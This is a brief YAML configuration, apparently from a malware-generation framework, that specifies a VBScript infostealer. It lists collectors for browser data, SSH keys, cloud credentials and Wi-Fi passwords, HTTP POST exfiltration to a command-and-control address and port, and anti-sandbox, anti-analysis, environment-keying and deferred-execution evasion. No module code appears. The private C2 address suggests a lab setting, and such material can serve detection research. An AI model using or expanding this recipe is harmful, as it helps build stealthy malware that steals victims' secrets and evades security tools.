name: vbs_infostealer_cs_full
description: Stealthy VBScript infostealer with evasion checks and deferred execution
format: vbscript
core:
- core/emit_buffer
- core/run_cmd
- core/file_ops
collectors:
- collectors/sysinfo
- collectors/processes
- collectors/network
- collectors/security_products
- collectors/browser_chromium
- collectors/ssh_keys
- collectors/cloud_creds
- collectors/wifi_passwords
exfil: exfil/http_post
arch: arch/sequential
evasion:
- evasion/anti_sandbox
- evasion/anti_analysis
- evasion/env_keying
- evasion/deferred_exec
vars:
  C2_IP: 10.0.2.2
  C2_PORT: '9001'
